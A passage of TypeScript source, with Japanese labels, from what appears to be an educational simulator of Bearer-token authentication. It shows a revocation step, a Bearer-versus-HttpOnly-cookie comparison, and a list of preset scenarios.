    response: { status: 401, statusText: "Unauthorized", headers: [{ name: "WWW-Authenticate", value: 'Bearer error="invalid_token", error_description="Token has been revoked"' }] },
  });

  steps.push({ step: ++s, type: "info", from: "auth", to: "auth", label: "ブラックリスト方式の特徴", detail: "利点: 即時無効化 / 欠点: 毎リクエストでDB確認が必要 → キャッシュ (Redis) で軽減", security: "safe", elapsedMs: elapsed });

  const verification = verifyJwt(jwt.raw, SECRET, { issuer: "https://auth.example.com", audience: "https://api.example.com" });
  return { name: "トークン無効化", description: "ブラックリスト方式による即時無効化", nodes, steps, jwt, verification, totalMs: elapsed };
}

/** 8. Bearer vs Cookie 比較 */
function presetBearerVsCookie(): NetworkSimResult {
  const nodes: NetworkNode[] = [
    { id: "client", role: "client", label: "ブラウザ", tokens: [] },
    { id: "api", role: "server", label: "APIサーバー", tokens: [] },
  ];
  const steps: NetworkStep[] = [];
  let s = 0;
  let elapsed = 0;

  const payload: JwtPayload = { sub: "user-1", iss: "https://auth.example.com", aud: "https://api.example.com", exp: now() + 3600, iat: now() };
  const jwt = createJwt(payload, SECRET);

  // === Bearer方式 ===
  steps.push({ step: ++s, type: "info", from: "client", to: "client", label: "【Bearer方式】", detail: "トークンをAuthorizationヘッダーで送信", security: "safe", elapsedMs: elapsed });

  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_request", from: "client", to: "api",
    label: "Bearer: GET /api/data", detail: "Authorization: Bearer <token>",
    security: "safe", elapsedMs: elapsed,
    request: { method: "GET", url: "https://api.example.com/api/data", headers: [bearerHeader(jwt.raw)] },
    data: { "CSRF保護": "不要 (自動送信されない)", "クロスオリジン": "対応可能 (CORS設定)", "保存場所": "メモリ or localStorage", "XSS耐性": "低 (JSからアクセス可能)" },
  });

  elapsed += latency(10, 3);
  steps.push({ step: ++s, type: "token_validate", from: "api", to: "api", label: "Bearer: JWT検証", detail: "Authorizationヘッダーからトークンを抽出して検証", security: "safe", elapsedMs: elapsed });

  elapsed += latency(10, 3);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "client",
    label: "Bearer: 200 OK", detail: "成功",
    security: "safe", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson()], body: '{"method": "Bearer"}' },
  });

  // === Cookie方式 ===
  steps.push({ step: ++s, type: "info", from: "client", to: "client", label: "【Cookie方式】", detail: "トークンをHttpOnly Cookieで送信", security: "safe", elapsedMs: elapsed });

  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_request", from: "client", to: "api",
    label: "Cookie: GET /api/data", detail: "Cookie: session=<token> (ブラウザが自動送信)",
    security: "safe", elapsedMs: elapsed,
    request: { method: "GET", url: "https://api.example.com/api/data", headers: [{ name: "Cookie", value: `session=${jwt.raw.slice(0, 30)}...`, sensitive: true }, { name: "X-CSRF-Token", value: "csrf-abc123", sensitive: true }] },
    data: { "CSRF保護": "必要 (CSRFトークンが必要)", "クロスオリジン": "制限あり (SameSite)", "保存場所": "HttpOnly Cookie", "XSS耐性": "高 (JSからアクセス不可)" },
  });

  elapsed += latency(10, 3);
  steps.push({ step: ++s, type: "token_validate", from: "api", to: "api", label: "Cookie: JWT検証 + CSRF確認", detail: "CookieからJWTを抽出、CSRFトークンも検証", security: "safe", elapsedMs: elapsed });

  elapsed += latency(10, 3);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "client",
    label: "Cookie: 200 OK", detail: "成功",
    security: "safe", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson(), { name: "Set-Cookie", value: "session=...; HttpOnly; Secure; SameSite=Strict; Path=/" }], body: '{"method": "Cookie"}' },
  });

  // 比較まとめ
  steps.push({ step: ++s, type: "info", from: "api", to: "api", label: "比較まとめ", detail: "Bearer: モバイル/SPA/マイクロサービス向き | Cookie: 伝統的Webアプリ向き。セキュリティはHttpOnly Cookie + CSRFトークンが最も安全", security: "safe", elapsedMs: elapsed });

  const verification = verifyJwt(jwt.raw, SECRET, { issuer: "https://auth.example.com", audience: "https://api.example.com" });
  return { name: "Bearer vs Cookie 比較", description: "2つの認証方式のトレードオフ", nodes, steps, jwt, verification, totalMs: elapsed };
}

// ── 公開API ──

export const NETWORK_PRESETS: NetworkPreset[] = [
  { name: "正常なBearer認証フロー (HTTPS)", description: "DNS→TLS→ログイン→JWT取得→APIアクセスの全ステップ", run: presetNormalBearer },
  { name: "MITM トークン傍受攻撃", description: "HTTP平文通信で攻撃者がBearerトークンを傍受・再利用", run: presetMitmAttack },
  { name: "トークンリフレッシュフロー", description: "期限切れ→401→リフレッシュ→リトライ成功", run: presetTokenRefresh },
  { name: "CORS + Bearer認証", description: "クロスオリジンプリフライト→本リクエスト", run: presetCorsBearer },
  { name: "XSSトークン窃取攻撃", description: "XSSでlocalStorageからトークン漏洩→不正利用", run: presetXssTheft },
  { name: "マイクロサービス間Bearer認証", description: "ゲートウェイ→内部トークン→サービス間通信チェーン", run: presetServiceToService },
  { name: "トークン無効化 (ブラックリスト)", description: "不正検知→即時トークン無効化→アクセス拒否", run: presetTokenRevocation },
  { name: "Bearer vs Cookie 比較", description: "2つの認証方式のセキュリティ特性比較", run: presetBearerVsCookie },
];
